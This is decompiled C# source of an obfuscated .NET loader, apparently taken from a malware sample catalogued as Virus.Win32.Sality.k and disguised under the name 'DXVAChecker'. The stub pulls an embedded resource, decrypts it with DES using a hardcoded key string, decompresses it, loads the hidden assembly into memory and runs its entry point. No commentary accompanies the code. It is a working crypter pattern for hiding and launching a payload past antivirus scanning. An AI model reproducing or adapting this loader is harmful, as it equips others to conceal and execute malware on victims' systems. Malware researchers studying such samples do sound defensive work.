// Decompiled with JetBrains decompiler
// Type:  . 
// Assembly: DXVAChecker, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9286E221-58C8-4EF1-9AED-5D60C4ECEE63
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Virus.Win32.Sality.k-ee7dce62c4bed6fb9d166a9eef4f4cf9597bffffe7778013e726b27cba17de7e.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0020
{
  internal static class \u0020
  {
    private static string \u0020 = "a68ca6a1";
    private static string \u0028 = "9b4a6429";

    [STAThread]
    private static void \u007B()
    {
      object[] parameters1 = (object[]) null;
      \u0020.\u0020.\u0028 = ((GuidAttribute) Assembly.GetEntryAssembly().GetCustomAttributes(typeof (GuidAttribute), false)[0]).Value;
      Assembly assembly = \u0020.\u0020.\u0029(\u0020.\u0020.\u0020);
      if ((object) assembly == null)
        return;
      MethodInfo entryPoint = assembly.EntryPoint;
      ParameterInfo[] parameters2 = entryPoint.GetParameters();
      if (parameters2 != null && parameters2.Length > 0)
        parameters1 = new object[1]
        {
          (object) Environment.GetCommandLineArgs()
        };
      entryPoint.Invoke((object) null, parameters1);
    }

    private static Assembly \u0029(string _param0)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
      byte[] rawAssembly = \u0020.\u0020.\u0020((byte[]) new ResourceManager(manifestResourceNames[0].Substring(0, manifestResourceNames[0].LastIndexOf(".")), executingAssembly).GetObject(_param0));
      return rawAssembly == null ? (Assembly) null : Assembly.Load(rawAssembly);
    }

    private static byte[] \u0020(byte[] _param0)
    {
      if (_param0 == null)
        return (byte[]) null;
      MemoryStream memoryStream1 = (MemoryStream) null;
      MemoryStream memoryStream2 = (MemoryStream) null;
      DeflateStream deflateStream = (DeflateStream) null;
      MemoryStream memoryStream3 = (MemoryStream) null;
      byte[] numArray = (byte[]) null;
      try
      {
        memoryStream1 = new MemoryStream(_param0);
        memoryStream1.Read(_param0, 0, _param0.Length);
        memoryStream1.Seek(0L, SeekOrigin.Begin);
        MemoryStream memoryStream4 = \u0020.\u0020.\u0028(memoryStream1);
        memoryStream1.Close();
        memoryStream1 = (MemoryStream) null;
        if (memoryStream4 != null)
        {
          deflateStream = new DeflateStream((Stream) memoryStream4, CompressionMode.Decompress);
          memoryStream3 = new MemoryStream();
          byte[] buffer = new byte[1024];
          int count;
          while ((count = deflateStream.Read(buffer, 0, buffer.Length)) > 0)
            memoryStream3.Write(buffer, 0, count);
          deflateStream.Close();
          deflateStream = (DeflateStream) null;
          memoryStream4.Close();
          memoryStream2 = (MemoryStream) null;
          numArray = memoryStream3.ToArray();
        }
        return numArray;
      }
      finally
      {
        deflateStream?.Close();
        memoryStream1?.Close();
        memoryStream3?.Close();
      }
    }

    private static MemoryStream \u0028(MemoryStream _param0)
    {
      CryptoStream cryptoStream = (CryptoStream) null;
      try
      {
        DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
        byte[] bytes = Encoding.UTF8.GetBytes(\u0020.\u0020.\u0028);
        cryptoServiceProvider.Key = \u0020.\u0020.\u007D(bytes, cryptoServiceProvider.Key.Length);
        cryptoServiceProvider.IV = \u0020.\u0020.\u007D(bytes, cryptoServiceProvider.IV.Length);
        ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor();
        cryptoStream = new CryptoStream((Stream) _param0, decryptor, CryptoStreamMode.Read);
        MemoryStream memoryStream = new MemoryStream();
        byte[] buffer = new byte[1024];
        int count;
        while ((count = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
          memoryStream.Write(buffer, 0, count);
        memoryStream.Seek(0L, SeekOrigin.Begin);
        return memoryStream;
      }
      finally
      {
        cryptoStream?.Close();
      }
    }

    private static byte[] \u007D(byte[] _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      if (_param0.Length <= _param1)
      {
        for (int index = 0; index < _param0.Length; ++index)
          numArray[index] = _param0[index];
      }
      else
      {
        int num = 0;
        for (int index = 0; index < _param0.Length; ++index)
        {
          numArray[num++] ^= _param0[index];
          if (num >= numArray.Length)
            num = 0;
        }
      }
      return numArray;
    }
  }
}
